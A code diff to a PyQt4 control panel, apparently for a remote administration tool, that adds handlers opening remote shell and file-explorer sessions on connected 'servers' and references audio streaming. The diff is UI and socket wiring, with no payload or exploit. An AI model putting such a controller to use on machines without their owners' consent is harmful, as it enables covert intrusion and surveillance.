@@ -20,6 +20,9 @@ from PyQt4.QtCore import *
 from ui import gui
 
 from libs.modechat import get, send
+from plugins.maudio import main as maudio
+from plugins.mexplorer import main as mexplorer
+from plugins.mshell import main as mshell
 
 import plugins
 
@@ -91,14 +94,16 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Panel Triggers
         self.updatePreviewButton.clicked.connect(self.getPreview)
         self.unlockServerButton.clicked.connect(self.unlockServer)
-        self.remoteShellButton.clicked.connect(lambda: self.runPlugin(plugin='mshell'))
-        self.remoteExplorerButton.clicked.connect(lambda: self.runPlugin(plugin='mexplorer'))
+        self.remoteShellButton.clicked.connect(self.runShell)
+        self.remoteExplorerButton.clicked.connect(self.runExplorer)
         self.lockServerButton.clicked.connect(self.lockServer)
         self.quitServerButton.clicked.connect(self.lockServer)
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
         self.connect(self, SIGNAL('updatePanel()'), self.updatePanel)
+        self.connect(self, SIGNAL('executeShell()'), self.executeShell)
+        self.connect(self, SIGNAL('executeExplorer()'), self.executeExplorer)
 
     # Start Listen for Servers
     def startListen(self):
@@ -149,7 +154,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 return
             if self.sock:
 
-                data = get(self.sock, 'CHECK SOCKET STATUS', 'status')
+                data = get(self.sock, 'myinfo', 'status')
 
                 if data == 'parent':
 
@@ -176,7 +181,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 else:
                     mode, index = data.split(' ')
-                    print mode
                     try:
                         if self.socks.has_key(int(index)):
                             i = int(index)
@@ -194,8 +198,15 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                             elif mode == 'audioStreaming':
                                 print 'audio streaming start'
-                    except ValueError:
-                        pass
+
+                            elif mode == 'shellMode':
+                                self.signalShell(self.sock)
+
+                            elif mode == 'explorerMode':
+                                self.signalExplorer(self.sock)
+
+                    except ValueError as e:
+                        print e
 
     # Servers Live Update
     def checkServers(self):
@@ -406,6 +417,42 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     # id generator for new windows
     def id_generator(self, size=16, chars=string.ascii_uppercase + string.digits):
         return ''.join(random.choice(chars) for _ in range(size))
+
+    def signalExplorer(self, sock):
+        self.current_sock = sock
+        self.emit(SIGNAL('executeExplorer()'))
+
+    def runExplorer(self):
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        data = get(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'explorerMode')
+
+    def executeExplorer(self):
+        args = {}
+        args['sock'] = self.current_sock
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        args['socket'] = self.socks[sockind]['socket']
+        args['ipAddress'] = self.socks[sockind]['ip_address']
+        tmpid = self.id_generator()
+        self.pluginsBank[tmpid] = mexplorer.mainPopup(args=args)
+        self.pluginsBank[tmpid].show()
+
+    def signalShell(self, sock):
+        self.current_sock = sock
+        self.emit(SIGNAL('executeShell()'))
+
+    def runShell(self):
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        data = get(self.socks[sockind]['sock'], 'startChildSocket %s' % sockind, 'shellMode')
+
+    def executeShell(self):
+        args = {}
+        args['sock'] = self.current_sock
+        sockind = int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
+        args['socket'] = self.socks[sockind]['socket']
+        args['ipAddress'] = self.socks[sockind]['ip_address']
+        tmpid = self.id_generator()
+        self.pluginsBank[tmpid] = mshell.mainPopup(args=args)
+        self.pluginsBank[tmpid].show()
 
     # Run Plugin
     def runPlugin(self, plugin):
